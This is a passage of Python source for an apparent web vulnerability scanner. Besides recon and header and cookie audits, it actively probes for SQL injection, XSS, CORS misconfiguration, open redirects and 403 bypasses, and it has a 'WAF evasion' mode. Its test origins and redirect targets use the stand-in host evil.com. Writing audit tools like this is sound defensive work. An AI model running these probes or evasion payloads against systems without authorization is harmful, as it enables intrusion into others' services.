            req_headers.update(BROWSER_HEADERS)
        else:
            req_headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        if headers:
            req_headers.update(headers)

        try:
            if CAPS["requests"] and self._session:
                resp = self._session.request(
                    method, url,
                    headers=req_headers,
                    data=data,
                    timeout=timeout,
                    verify=False,
                    allow_redirects=allow_redirects,
                )
                return {
                    "status": resp.status_code,
                    "headers": dict(resp.headers),
                    "body": resp.text,
                    "bytes": resp.content,
                    "url": resp.url,
                    "redirected": resp.url != url,
                }
            else:
                # urllib path — build proxy opener if configured
                handlers = []
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                if self.proxy:
                    handlers.append(urllib.request.ProxyHandler({"http": self.proxy, "https": self.proxy}))
                handlers.append(urllib.request.HTTPSHandler(context=ctx))
                opener = urllib.request.build_opener(*handlers)
                req = urllib.request.Request(url, headers=req_headers, method=method)
                if not allow_redirects:
                    opener.addheaders = []
                with opener.open(req, timeout=timeout) as resp:
                    body = resp.read().decode("utf-8", errors="ignore")
                    return {
                        "status": resp.status,
                        "headers": dict(resp.headers),
                        "body": body,
                        "bytes": body.encode(),
                        "url": resp.url,
                        "redirected": resp.url != url,
                    }
        except Exception:
            return None

    def _get(self, url: str, headers: dict = None, timeout: float = None) -> Optional[Dict]:
        """Convenience GET wrapper."""
        return self._request(url, method="GET", headers=headers, timeout=timeout)

    def _add_finding(self, vuln_key: str, detail: str = "", evidence: str = "",
                     url: str = "", severity_override: str = ""):
        """Add a vulnerability finding."""
        if vuln_key in VULN_DB:
            v = VULN_DB[vuln_key]
            finding = {
                "name": v["name"],
                "severity": severity_override or v["severity"],
                "cwe": v["cwe"],
                "owasp": v["owasp"],
                "description": v["description"],
                "impact": v["impact"],
                "fix": v["fix"],
                "detail": detail,
                "evidence": evidence,
                "url": url or self.url,
            }
        else:
            finding = {
                "name": vuln_key,
                "severity": severity_override or "INFO",
                "description": detail,
                "evidence": evidence,
                "url": url or self.url,
            }
        self.findings.append(finding)

    def _severity_color(self, sev: str) -> str:
        colors = {"CRITICAL": R, "HIGH": R, "MEDIUM": Y, "LOW": C, "INFO": B}
        return colors.get(sev, W)

    # =========================================================================
    # OPERATION: RECON (Web OSINT)
    # =========================================================================

    def op_recon(self):
        """Full web OSINT reconnaissance."""
        section("WEB OSINT RECON")

        results = {}

        info("DNS records...")
        dns_results = self._dns_lookup()
        results["dns"] = dns_results

        info("WHOIS...")
        whois_result = self._whois_lookup()
        results["whois"] = whois_result

        info("SSL/TLS certificate...")
        ssl_result = self._ssl_inspect()
        results["ssl"] = ssl_result

        info("robots.txt / sitemap...")
        results["robots_sitemap"] = self._fetch_robots_sitemap()

        info("Security headers...")
        results["headers"] = self._headers_audit()

        info("Technology fingerprinting...")
        results["technologies"] = self._tech_detect()

        return results

    def _dns_lookup(self) -> Dict:
        """Perform comprehensive DNS lookup."""
        records = {}
        record_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]

        for rtype in record_types:
            try:
                if CAPS["dns"]:
                    answers = dns.resolver.resolve(self.host, rtype, raise_on_no_answer=False)
                    records[rtype] = [str(r) for r in answers]
                else:
                    result = subprocess.run(
                        ["dig", "+short", rtype, self.host],
                        capture_output=True, text=True, timeout=5
                    )
                    if result.returncode == 0 and result.stdout.strip():
                        records[rtype] = result.stdout.strip().split("\n")

                if rtype in records and records[rtype]:
                    ok(f"{rtype}: {', '.join(records[rtype])}")
            except Exception:
                pass

        if "TXT" in records:
            for txt in records["TXT"]:
                if "spf" in txt.lower():
                    info(f"SPF Record found: {txt[:80]}")
                if "dmarc" in txt.lower():
                    info(f"DMARC policy found: {txt[:80]}")
                if "v=DKIM" in txt:
                    info("DKIM record found - email signing is configured")

        return records

    def _whois_lookup(self) -> Dict:
        """Perform WHOIS lookup."""
        result = {}
        try:
            proc = subprocess.run(
                ["whois", self.host],
                capture_output=True, text=True, timeout=15
            )
            raw = proc.stdout

            for field_name, patterns in [
                ("registrar", [r"Registrar:\s*(.+)", r"registrar:\s*(.+)"]),
                ("created", [r"Creation Date:\s*(.+)", r"created:\s*(.+)"]),
                ("expires", [r"Registry Expiry Date:\s*(.+)", r"expires:\s*(.+)"]),
                ("updated", [r"Updated Date:\s*(.+)", r"last-modified:\s*(.+)"]),
                ("nameservers", [r"Name Server:\s*(.+)"]),
                ("org", [r"Registrant Organization:\s*(.+)", r"org:\s*(.+)"]),
                ("country", [r"Registrant Country:\s*(.+)", r"country:\s*(.+)"]),
            ]:
                for pattern in patterns:
                    matches = re.findall(pattern, raw, re.IGNORECASE)
                    if matches:
                        result[field_name] = matches[0].strip() if len(matches) == 1 else [m.strip() for m in matches]
                        break

            if result:
                for k, v in result.items():
                    info(f"{k.capitalize()}: {v}")
        except Exception as e:
            warn(f"WHOIS lookup failed: {e}")

        return result

    def _ssl_inspect(self) -> Dict:
        """Inspect SSL/TLS certificate."""
        result = {}
        if self.scheme != "https" and self.port != 443:
            warn("Not an HTTPS target, skipping SSL inspection")
            return result

        try:
            context = ssl_lib.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl_lib.CERT_NONE

            with socket.create_connection((self.host, self.port), timeout=self.timeout) as sock:
                with context.wrap_socket(sock, server_hostname=self.host) as ssock:
                    cert = ssock.getpeercert()
                    result["tls_version"] = ssock.version()
                    result["cipher"] = ssock.cipher()

                    if cert:
                        subject = dict(x[0] for x in cert.get("subject", ()))
                        issuer = dict(x[0] for x in cert.get("issuer", ()))
                        result["subject"] = subject.get("commonName", "")
                        result["issuer"] = issuer.get("organizationName", "")
                        result["issued_to"] = subject.get("commonName", "")
                        result["valid_from"] = cert.get("notBefore", "")
                        result["valid_to"] = cert.get("notAfter", "")
                        result["san"] = [x[1] for x in cert.get("subjectAltName", ())]

                        ok(f"Subject: {result['subject']}")
                        ok(f"Issuer: {result['issuer']}")
                        ok(f"Valid to: {result['valid_to']}")
                        ok(f"TLS Version: {result['tls_version']}")

                        if result["san"]:
                            info(f"Subject Alternative Names ({len(result['san'])} entries):")
                            for san in result["san"][:20]:
                                info(f"  -> {san}")

                        tls_ver = result["tls_version"]
                        if tls_ver in ("TLSv1", "TLSv1.1", "SSLv3"):
                            self._add_finding("weak_ssl",
                                detail=f"Server accepted connection using deprecated {tls_ver}",
                                evidence=f"TLS version negotiated: {tls_ver}")
                            bad(f"Weak TLS version: {tls_ver}")

                        cipher_name = result["cipher"][0] if result["cipher"] else ""
                        weak_ciphers = ["RC4", "DES", "3DES", "EXPORT", "NULL", "MD5"]
                        for wc in weak_ciphers:
                            if wc in cipher_name.upper():
                                self._add_finding("weak_ssl",
                                    detail=f"Weak cipher suite in use: {cipher_name}")

        except Exception as e:
            warn(f"SSL inspection error: {e}")

        info(f"Certificate Transparency logs: https://crt.sh/?q={self.host}")
        result["crt_sh_url"] = f"https://crt.sh/?q={self.host}"

        return result

    def _fetch_robots_sitemap(self) -> Dict:
        """Fetch robots.txt and sitemap.xml."""
        result = {}

        for path, name in [("/robots.txt", "robots"), ("/sitemap.xml", "sitemap"),
                            ("/.well-known/security.txt", "security_txt")]:
            resp = self._request(f"{self.url}{path}")
            if resp and resp["status"] == 200:
                ok(f"Found {name}: {self.url}{path}")
                result[name] = resp["body"][:3000]

                if name == "robots":
                    disallowed = re.findall(r"Disallow:\s*(.+)", resp["body"])
                    if disallowed:
                        info(f"Disallowed paths ({len(disallowed)} entries):")
                        for p in disallowed[:20]:
                            info(f"  -> {p.strip()}")

                if name == "security_txt":
                    info("security.txt found - vulnerability disclosure policy present")
            else:
                info(f"{name}: Not found ({resp['status'] if resp else 'no response'})")

        return result

    def _headers_audit(self) -> Dict:
        """Audit HTTP security headers."""
        resp = self._request(self.url)
        if not resp:
            bad("Could not reach target")
            return {}

        headers = {k.lower(): v for k, v in resp["headers"].items()}
        result = {"raw": resp["headers"], "findings": []}

        checks = [
            ("strict-transport-security", "missing_hsts", "HSTS"),
            ("content-security-policy", "missing_csp", "CSP"),
            ("x-frame-options", "missing_xframe", "X-Frame-Options"),
            ("x-content-type-options", "missing_xcontent", "X-Content-Type-Options"),
        ]

        for header, vuln_key, label in checks:
            if header in headers:
                ok(f"{label}: {headers[header]}")
            else:
                warn(f"MISSING: {label}")
                self._add_finding(vuln_key)

        if "referrer-policy" in headers:
            ok(f"Referrer-Policy: {headers['referrer-policy']}")
        else:
            warn("MISSING: Referrer-Policy")

        if "permissions-policy" in headers:
            ok(f"Permissions-Policy: {headers['permissions-policy'][:60]}")

        if "server" in headers:
            server = headers["server"]
            info(f"Server header: {server}")
            if any(char.isdigit() for char in server):
                self._add_finding("server_version_disclosure",
                    evidence=f"Server: {server}")
                warn(f"Version disclosed in Server header: {server}")

        if "x-powered-by" in headers:
            powered = headers["x-powered-by"]
            warn(f"X-Powered-By disclosed: {powered}")
            self._add_finding("server_version_disclosure",
                detail="Tech stack disclosed via X-Powered-By header",
                evidence=f"X-Powered-By: {powered}")

        return result

    def _tech_detect(self) -> Dict:
        """Detect technologies used."""
        resp = self._request(self.url)
        if not resp:
            return {}

        body = resp["body"]
        headers_str = str(resp["headers"])
        full_text = body + headers_str
        detected = {}

        for tech, patterns in TECH_SIGNATURES.items():
            for pattern in patterns:
                if re.search(pattern, full_text, re.IGNORECASE):
                    detected[tech] = True
                    ok(f"Detected: {tech}")
                    break

        jquery_match = re.search(r"jquery[/-]([\d.]+)(?:\.min)?\.js", full_text, re.IGNORECASE)
        if jquery_match:
            version = jquery_match.group(1)
            info(f"jQuery version: {version}")
            parts = [int(x) for x in version.split(".")[:2] if x.isdigit()]
            if parts and (parts[0] < 3 or (parts[0] == 3 and len(parts) > 1 and parts[1] < 6)):
                self._add_finding("outdated_libs",
                    detail=f"jQuery {version} has known XSS vulnerabilities",
                    evidence=f"Detected jQuery version: {version}")
                warn(f"Potentially outdated jQuery: {version}")

        return {"detected": list(detected.keys())}

    # =========================================================================
    # OPERATION: DIRECTORY/FILE DISCOVERY
    # =========================================================================

    def op_dirs(self) -> Dict:
        """Discover directories and sensitive files."""
        section("DIRECTORY & FILE DISCOVERY")

        wordlist = COMMON_PATHS
        custom_wl = self.params.get("wordlist_file", "")
        if custom_wl and os.path.exists(custom_wl):
            with open(custom_wl) as f:
                wordlist = [line.strip() for line in f if line.strip()]
            info(f"Loaded {len(wordlist)} paths from {custom_wl}")

        found = []
        interesting = []

        def check_path(path):
            if not path.startswith("/"):
                path = "/" + path
            url = f"{self.url}{path}"
            resp = self._request(url, allow_redirects=False, timeout=5.0)
            if resp and resp["status"] not in (404, 400, 410):
                return {"path": path, "status": resp["status"], "size": len(resp["body"]), "url": url}
            return None

        info(f"Checking {len(wordlist)} paths with {self.threads} threads...")

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(check_path, p): p for p in wordlist}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    status = result["status"]
                    path = result["path"]

                    is_interesting = any(x in path for x in [
                        ".env", ".git", "config", "backup", "admin",
                        "phpinfo", "debug", ".sql", "swagger", "graphql"
                    ])

                    if is_interesting:
                        bad(f"[{status}] {path} <- INTERESTING!")
                        interesting.append(result)

                        if "wp-config" in path and status == 200:
                            self._add_finding("sensitive_files_exposed",
                                detail="wp-config.php exposed — contains DB credentials and secret keys",
                                evidence=f"HTTP {status} at {result['url']}",
                                url=result["url"],
                                severity_override="CRITICAL")
                        elif ".git" in path:
                            self._add_finding("sensitive_files_exposed",
                                detail="Git repository exposed - full source code may be accessible",
                                evidence=f"HTTP {status} at {result['url']}",
                                url=result["url"])
                        elif ".env" in path:
                            self._add_finding("sensitive_files_exposed",
                                detail=".env file accessible - likely contains API keys and passwords",
                                evidence=f"HTTP {status} at {result['url']}",
                                url=result["url"])
                        elif "swagger" in path or "graphql" in path:
                            info(f"API documentation found: {result['url']}")
                    else:
                        info(f"[{status}] {path}")

                    found.append(result)

        info(f"Found {len(found)} accessible paths, {len(interesting)} interesting")
        return {"found": found, "interesting": interesting}

    # =========================================================================
    # OPERATION: SECURITY HEADERS AUDIT
    # =========================================================================

    def op_headers(self) -> Dict:
        """Detailed security headers analysis."""
        section("SECURITY HEADERS AUDIT")
        return self._headers_audit()

    # =========================================================================
    # OPERATION: CORS TESTING
    # =========================================================================

    def op_cors(self) -> Dict:
        """Test for CORS misconfigurations."""
        section("CORS MISCONFIGURATION TESTING")

        results = {}
        test_origins = [
            "https://evil.com",
            f"https://evil.{self.host}",
            f"https://{self.host}.evil.com",
            "null",
            f"https://{self.host}",
        ]

        for origin in test_origins:
            resp = self._request(self.url, headers={"Origin": origin})
            if not resp:
                continue

            acao = resp["headers"].get("Access-Control-Allow-Origin", "")
            acac = resp["headers"].get("Access-Control-Allow-Credentials", "")

            if acao == "*":
                warn(f"Wildcard CORS: Origin={origin} -> ACAO={acao}")
                self._add_finding("cors_wildcard",
                    detail="Access-Control-Allow-Origin: * allows all origins",
                    evidence=f"Request Origin: {origin}\nResponse ACAO: {acao}")
                results["wildcard"] = True

            elif acao == origin and origin != f"https://{self.host}":
                if acac.lower() == "true":
                    bad(f"REFLECTED CORS with credentials: Origin={origin} -> ACAO={acao}, ACAC={acac}")
                    self._add_finding("cors_reflect_origin",
                        detail="Server reflects arbitrary Origin and allows credentials - Critical CORS bypass",
                        evidence=f"Request Origin: {origin}\nResponse ACAO: {acao}\nResponse ACAC: {acac}",
                        severity_override="CRITICAL")
                else:
                    warn(f"Reflected CORS (no credentials): Origin={origin} -> ACAO={acao}")
                    self._add_finding("cors_reflect_origin",
                        detail="Server reflects arbitrary Origin header",
                        evidence=f"Request Origin: {origin}\nResponse ACAO: {acao}")
                results.setdefault("reflected", []).append(origin)
            else:
                info(f"Origin: {origin} -> ACAO: {acao or 'not set'}")

        return results

    # =========================================================================
    # OPERATION: COOKIE AUDIT
    # =========================================================================

    def op_cookies(self) -> Dict:
        """Audit cookie security attributes."""
        section("COOKIE SECURITY AUDIT")

        resp = self._request(self.url)
        if not resp:
            return {}

        set_cookie_headers = []
        for key, value in resp["headers"].items():
            if key.lower() == "set-cookie":
                set_cookie_headers.append(value)

        if not set_cookie_headers:
            info("No Set-Cookie headers in response. Try authenticated pages.")
            return {}

        results = []
        for cookie_str in set_cookie_headers:
            parts = [p.strip() for p in cookie_str.split(";")]
            name_val = parts[0].split("=")[0] if "=" in parts[0] else parts[0]
            flags = {p.split("=")[0].lower(): p.split("=")[1] if "=" in p else True
                     for p in parts[1:]}

            info(f"\nCookie: {name_val}")
            cookie_issues = []

            secure = "secure" in flags
            httponly = "httponly" in flags
            samesite = flags.get("samesite", "").lower()

            ok(f"  Secure: {'yes' if secure else 'NO'}")
            ok(f"  HttpOnly: {'yes' if httponly else 'NO'}")
            ok(f"  SameSite: {samesite or 'NOT SET'}")

            if not secure and self.scheme == "https":
                self._add_finding("insecure_cookie",
                    detail=f"Cookie '{name_val}' missing Secure flag",
                    evidence=f"Set-Cookie: {cookie_str}")
                cookie_issues.append("missing_secure")

            if not httponly:
                self._add_finding("cookie_no_httponly",
                    detail=f"Cookie '{name_val}' missing HttpOnly flag",
                    evidence=f"Set-Cookie: {cookie_str}")
                cookie_issues.append("missing_httponly")

            if not samesite or samesite == "none":
                if not samesite:
                    self._add_finding("cookie_no_samesite",
                        detail=f"Cookie '{name_val}' missing SameSite flag",
                        evidence=f"Set-Cookie: {cookie_str}")
                    cookie_issues.append("missing_samesite")
                elif samesite == "none" and not secure:
                    warn(f"  SameSite=None requires Secure flag!")

            results.append({"name": name_val, "issues": cookie_issues, "raw": cookie_str})

        return {"cookies": results}

    # =========================================================================
    # OPERATION: SQL INJECTION DETECTION
    # =========================================================================

    def op_sqli(self) -> Dict:
        """Test for SQL injection vulnerabilities (error-based + time-based blind)."""
        section("SQL INJECTION DETECTION")

        warn("Always get written authorization before running SQLi tests.")

        results = {"vulnerable": [], "tested": 0}
        test_url = self.test_url or self.params.get("test_url", self.url)

        resp = self._request(test_url)
        if not resp:
            return results

        test_points = []

        parsed = urllib.parse.urlparse(test_url)
        if parsed.query:
            params = urllib.parse.parse_qs(parsed.query)
            for param_name, values in params.items():
                test_points.append(("GET", param_name, test_url))
                info(f"Found GET parameter: {param_name}")

        if CAPS["bs4"] and resp["body"]:
            soup = BeautifulSoup(resp["body"], "html.parser")
            for form in soup.find_all("form"):
                action = form.get("action", test_url)
                method = form.get("method", "GET").upper()
                if not action.startswith("http"):
                    action = f"{self.url}{action}" if action.startswith("/") else f"{self.url}/{action}"
                for input_tag in form.find_all(["input", "textarea"]):
                    name = input_tag.get("name", "")
                    if name and input_tag.get("type") not in ("submit", "hidden", "csrf"):
                        test_points.append((method, name, action))
                        info(f"Found form field: {name} [{method}] -> {action}")

        if not test_points:
            info("No parameters found to test. Use test_url param with a URL containing ?param=value")
            return results

        base_params_map = {}
        parsed = urllib.parse.urlparse(test_url)
        if parsed.query:
            base_params_map = dict(urllib.parse.parse_qsl(parsed.query))

        for method, param, url in test_points:
            # Error-based tests
            for payload in SQLI_PAYLOADS[:5]:
                results["tested"] += 1

                if method == "GET":
                    p = urllib.parse.urlparse(url)
                    params_dict = urllib.parse.parse_qs(p.query)
                    params_dict[param] = [payload]
                    new_query = urllib.parse.urlencode(params_dict, doseq=True)
                    test_target = urllib.parse.urlunparse(p._replace(query=new_query))
                    r = self._request(test_target, timeout=8.0)
                else:
                    r = self._request(url, method="POST",
                                      data=urllib.parse.urlencode({param: payload}))

                if not r:
                    continue

                body = r["body"]
                for pattern in SQLI_ERROR_PATTERNS:
                    if re.search(pattern, body, re.IGNORECASE):
                        bad(f"POSSIBLE SQLi: {param}='{payload}' triggered: {pattern}")
                        self._add_finding("sqli_error",
                            detail=f"Parameter '{param}' may be vulnerable to SQL injection",
                            evidence=f"Payload: {payload}\nError pattern matched: {pattern}",
                            url=url)
                        results["vulnerable"].append({
                            "param": param,
                            "payload": payload,
                            "url": url,
                            "pattern": pattern,
                            "type": "error_based"
                        })
                        break

            # Time-based blind tests
            for db, payload in TIME_SQLI.items():
                results["tested"] += 1
                test_p = base_params_map.copy()
                test_p[param] = payload

                if method == "GET":
                    p = urllib.parse.urlparse(url)
                    new_query = urllib.parse.urlencode(test_p)
                    test_target = urllib.parse.urlunparse(p._replace(query=new_query))
                    t0 = time.time()
                    r = self._request(test_target, timeout=12.0)
                    elapsed = time.time() - t0
                else:
                    t0 = time.time()
                    r = self._request(url, method="POST",
                                      data=urllib.parse.urlencode({param: payload}),
                                      timeout=12.0)
                    elapsed = time.time() - t0

                if r and elapsed >= 2.8:
                    bad(f"TIME-BASED SQLi: {param} delayed {elapsed:.2f}s with {db} payload")
                    self._add_finding("sqli_time_blind",
                        detail=f"Parameter '{param}' caused {elapsed:.2f}s delay (>{db} payload)",
                        evidence=f"Payload: {payload}\nElapsed: {elapsed:.2f}s",
                        url=url)
                    results["vulnerable"].append({
                        "param": param,
                        "payload": payload,
                        "url": url,
                        "db": db,
                        "elapsed": round(elapsed, 2),
                        "type": "time_blind"
                    })

        # WAF evasion SQLi if enabled
        if self.waf_evasion:
            info("WAF evasion mode: testing obfuscated SQLi payloads...")
            for method, param, url in test_points:
                for payload in WAF_EVASION_SQLI:
                    results["tested"] += 1
                    if method == "GET":
                        p = urllib.parse.urlparse(url)
                        params_dict = dict(urllib.parse.parse_qsl(p.query))
                        params_dict[param] = payload
                        test_target = urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(params_dict)))
                        r = self._request(test_target, timeout=8.0)
                    else:
                        r = self._request(url, method="POST", data=urllib.parse.urlencode({param: payload}))
                    if not r:
                        continue
                    for pattern in SQLI_ERROR_PATTERNS:
                        if re.search(pattern, r["body"], re.IGNORECASE):
                            bad(f"WAF-EVADED SQLi: {param}='{payload[:30]}...' triggered: {pattern}")
                            self._add_finding("sqli_error",
                                detail=f"WAF-evaded SQLi in parameter '{param}'",
                                evidence=f"Evasion payload: {payload}\nPattern: {pattern}",
                                url=url)
                            results["vulnerable"].append({"param": param, "payload": payload, "url": url, "type": "waf_evasion_sqli"})
                            break

        if not results["vulnerable"]:
            ok(f"No obvious SQLi found in {results['tested']} tests")

        return results

    # =========================================================================
    # OPERATION: XSS DETECTION
    # =========================================================================

    def op_xss(self) -> Dict:
        """Test for reflected XSS vulnerabilities."""
        section("CROSS-SITE SCRIPTING (XSS) DETECTION")

        warn("Testing for reflected XSS only. Stored XSS requires manual review.")

        results = {"vulnerable": [], "tested": 0}
        test_url = self.test_url or self.params.get("test_url", self.url)

        marker = f"WSEC{int(time.time())}"

        resp = self._request(test_url)
        if not resp:
            return results

        test_points = []
        parsed = urllib.parse.urlparse(test_url)
        if parsed.query:
            for param_name in urllib.parse.parse_qs(parsed.query):
                test_points.append(("GET", param_name, test_url))

        if CAPS["bs4"] and resp["body"]:
            soup = BeautifulSoup(resp["body"], "html.parser")
            for form in soup.find_all("form"):
                action = form.get("action", test_url)
                method = form.get("method", "GET").upper()
                if not action.startswith("http"):
                    action = f"{self.url}{action}" if action.startswith("/") else f"{self.url}/{action}"
                for inp in form.find_all(["input", "textarea"]):
                    name = inp.get("name", "")
                    if name and inp.get("type") not in ("submit", "hidden"):
                        test_points.append((method, name, action))

        if not test_points:
            info("No parameters found. Use test_url with ?param=value")
            return results

        for method, param, url in test_points:
            for payload in XSS_PAYLOADS:
                full_payload = f"{marker}{payload}"
                results["tested"] += 1

                if method == "GET":
                    p = urllib.parse.urlparse(url)
                    pdict = urllib.parse.parse_qs(p.query)
                    pdict[param] = [full_payload]
                    new_q = urllib.parse.urlencode(pdict, doseq=True)
                    target = urllib.parse.urlunparse(p._replace(query=new_q))
                    r = self._request(target)
                else:
                    r = self._request(url, method="POST",
                                      data=urllib.parse.urlencode({param: full_payload}))

                if not r:
                    continue

                body = r["body"]
                if marker in body:
                    if "&lt;" not in body and payload.startswith("<"):
                        bad(f"POSSIBLE XSS: {param} reflects unencoded HTML")
                        self._add_finding("xss_reflected",
                            detail=f"Parameter '{param}' reflects input without encoding",
                            evidence=f"Payload: {full_payload}",
                            url=url)
                        results["vulnerable"].append({
                            "param": param,
                            "payload": payload,
                            "url": url
                        })
                    elif payload in body:
                        bad(f"POSSIBLE XSS: {param} reflects payload unmodified")
                        self._add_finding("xss_reflected",
                            detail=f"Parameter '{param}' reflects payload without modification",
                            evidence=f"Payload: {full_payload}",
                            url=url)
                        results["vulnerable"].append({
                            "param": param,
                            "payload": payload,
                            "url": url
                        })
                    else:
                        ok(f"  {param}: Input reflected but HTML-encoded (safe)")
                else:
                    info(f"  {param}: Payload not reflected")

        # WAF evasion XSS if enabled
        if self.waf_evasion:
            info("WAF evasion mode: testing obfuscated XSS payloads...")
            for method, param, url in test_points:
                for payload in WAF_EVASION_XSS:
                    full_payload = f"{marker}{payload}"
                    results["tested"] += 1
                    if method == "GET":
                        p = urllib.parse.urlparse(url)
                        pdict = urllib.parse.parse_qs(p.query)
                        pdict[param] = [full_payload]
                        target = urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(pdict, doseq=True)))
                        r = self._request(target)
                    else:
                        r = self._request(url, method="POST", data=urllib.parse.urlencode({param: full_payload}))
                    if r and marker in r["body"] and "&lt;" not in r["body"]:
                        bad(f"WAF-EVADED XSS: {param} reflects obfuscated payload unencoded")
                        self._add_finding("xss_reflected",
                            detail=f"WAF-evaded XSS in parameter '{param}'",
                            evidence=f"Evasion payload: {payload}",
                            url=url)
                        results["vulnerable"].append({"param": param, "payload": payload, "url": url, "type": "waf_evasion_xss"})

        return results

    # =========================================================================
    # OPERATION: CSRF TESTING
    # =========================================================================

    def op_csrf(self) -> Dict:
        """Test for missing CSRF tokens on forms."""
        section("CSRF TOKEN DETECTION")

        # Always check homepage + common form pages
        form_pages = [self.url]
        for path in ["/wp-login.php", "/login", "/signin", "/register", "/account", "/contact"]:
            form_pages.append(self.url.rstrip("/") + path)

        results = {"findings": [], "tested_urls": form_pages}
        forms_found = 0

        for page_url in form_pages:
            resp = self._request(page_url)
            if not resp:
                continue
            body = resp["body"]
            has_form = "<form" in body.lower() and ("method" in body.lower() or "action" in body.lower())
            if not has_form:
                continue
            forms_found += 1
            has_token = any(re.search(pat, body, re.IGNORECASE) for pat in CSRF_TOKEN_PATTERNS)
            if not has_token:
                bad(f"Form without CSRF token: {page_url}")
                self._add_finding("csrf_missing_token",
                    detail=f"Form present at {page_url} but no CSRF token pattern detected",
                    evidence="No _token, csrf_token, csrfmiddlewaretoken, authenticity_token found",
                    url=page_url)
                results["findings"].append({
                    "type": "csrf_missing_token",
                    "severity": "MEDIUM",
                    "url": page_url,
                })
            else:
                ok(f"CSRF token detected: {page_url}")

        if forms_found == 0:
            info("No forms detected on any tested pages.")

        return results

    # =========================================================================
    # OPERATION: 403 BYPASS
    # =========================================================================

    def op_bypass_403(self) -> Dict:
        """Test for 403 forbidden bypass via headers and path tricks."""
        section("403 BYPASS TESTING")

        path = self.bypass_path
        full_url = self.url + path
        results = {"findings": [], "tested_path": path}

        resp = self._request(full_url)
        if not resp:
            bad(f"No response from {full_url}")
            return results

        if resp["status"] != 403:
            info(f"{path} returned {resp['status']} (not 403, skipping bypass tests)")
            return results

        info(f"{path} is 403 - attempting bypass techniques...")

        # Header-based bypass
        for hdr_dict in BYPASS_HEADERS:
            r = self._request(full_url, headers=hdr_dict)
            if r and r["status"] == 200:
                hdr_name = list(hdr_dict.keys())[0]
                bad(f"BYPASS via header {hdr_name}: got 200!")
                self._add_finding("bypass_403_header",
                    detail=f"403 bypassed on {path} using {hdr_name}",
                    evidence=f"Header: {hdr_dict}\nStatus: 200",
                    url=full_url)
                results["findings"].append({
                    "type": "403_bypass_header",
                    "bypass_header": hdr_name,
                    "url": full_url,
                })

        # Path manipulation bypass
        for trick in BYPASS_PATH_TRICKS:
            test_url = self.url + trick + path.lstrip("/")
            r = self._request(test_url)
            if r and r["status"] == 200:
                bad(f"BYPASS via path trick '{trick}': got 200 at {test_url}")
                self._add_finding("bypass_403_path",
                    detail=f"403 bypassed on {path} using path trick {trick}",
                    evidence=f"URL: {test_url}\nStatus: 200",
                    url=test_url)
                results["findings"].append({
                    "type": "403_bypass_path",
                    "bypass_path": test_url,
                    "url": full_url,
                })

        if not results["findings"]:
            ok(f"No bypass found for {path}")

        return results

    # =========================================================================
    # OPERATION: OPEN REDIRECT
    # =========================================================================

    def op_open_redirect(self) -> Dict:
        """Test for open redirect vulnerabilities."""
        section("OPEN REDIRECT TESTING")

        test_url = self.test_url or self.params.get("test_url", self.url)
        results = {"findings": [], "tested_url": test_url}

        parsed = urllib.parse.urlparse(test_url)
        existing = dict(urllib.parse.parse_qsl(parsed.query))
        test_params_list = list(existing.keys()) or REDIRECT_PARAMS[:5]

        info(f"Testing {len(test_params_list)} parameter(s) with {len(REDIRECT_PAYLOADS)} payloads each...")

        for param in test_params_list:
            for payload in REDIRECT_PAYLOADS:
                p = existing.copy()
                p[param] = payload
                test_target = test_url.split("?")[0] + "?" + urllib.parse.urlencode(p)
                r = self._request(test_target, allow_redirects=True, timeout=5.0)
                if r:
                    final = r.get("url", test_target)
                    final_host = urllib.parse.urlparse(final).netloc.lower().rstrip(".")
                    if final_host.endswith("evil.com") and final_host != urllib.parse.urlparse(test_target).netloc.lower().rstrip("."):
                        bad(f"OPEN REDIRECT: {param}={payload} -> {final}")
                        self._add_finding("open_redirect",
                            detail=f"Parameter '{param}' allows redirect to attacker-controlled domain",
                            evidence=f"Payload: {payload}\nRedirected to: {final}",
                            url=test_url)
                        results["findings"].append({
                            "param": param,
                            "payload": payload,
                            "redirected_to": final,
                            "url": test_url,
                        })
                        break

        if not results["findings"]:
            ok("No open redirects detected")

        return results

    # =========================================================================
    # OPERATION: FRAMEWORK CVE PROBES
    # =========================================================================

    def op_framework_cves(self) -> Dict:
        """Probe for framework-specific CVE paths (Jira, AEM, Confluence)."""
        section("FRAMEWORK CVE PROBES (Jira / AEM / Confluence)")

        results = {"findings": []}

        resp = self._request(self.url)
        if not resp:
            bad("Could not reach target")
            return results

        headers_lower = str(resp["headers"]).lower()
        body_lower = resp["body"].lower()

        # Strict Jira detection: require Atlassian-specific markers, not generic body text
        is_jira = (
            "x-seraph-loginreason" in headers_lower or
            "x-ausername" in headers_lower or
            "atlassian.net" in headers_lower or
            ("atlassian-token" in headers_lower and "jira" in body_lower) or
            re.search(r'content="atlassian jira', body_lower) is not None or
            "secure/dashboard.jspa" in body_lower or
            "secure/login.jspa" in body_lower
        )
        is_aem = "aem" in body_lower or "cq5" in body_lower or "granite" in body_lower
        is_confluence = "confluence" in body_lower and "atlassian" in body_lower

        paths_to_check = []
        if is_jira:
            info("Jira detected - probing CVE paths...")
            paths_to_check.extend([(p, note, "jira") for p, note in JIRA_PATHS])
        if is_aem:
            info("AEM detected - probing CVE paths...")
            paths_to_check.extend([(p, note, "aem") for p, note in AEM_PATHS])
        if is_confluence:
            info("Confluence detected - probing CVE paths...")
            paths_to_check.extend([(p, note, "confluence") for p, note in CONFLUENCE_PATHS])

        # Always probe a subset of Jira paths regardless
        if not is_jira:
            paths_to_check.extend([(p, note, "jira") for p, note in JIRA_PATHS[:3]])

        for path, note, framework in paths_to_check:
            r = self._request(self.url + path, timeout=6.0)
            if r and r["status"] in (200, 201, 301, 302):
                warn(f"[{r['status']}] {framework.upper()} path accessible: {path}")
                info(f"  Note: {note}")
                self._add_finding("framework_cve",
                    detail=f"{framework.upper()} - {note}",
                    evidence=f"HTTP {r['status']} at {self.url + path}",
                    url=self.url + path)
                results["findings"].append({
                    "framework": framework,
                    "path": path,
                    "status_code": r["status"],
                    "note": note,
                    "url": self.url + path,
                })

        if not results["findings"]:
            ok("No accessible framework CVE paths found")

        return results

    # =========================================================================
    # OPERATION: FILE UPLOAD DETECTION
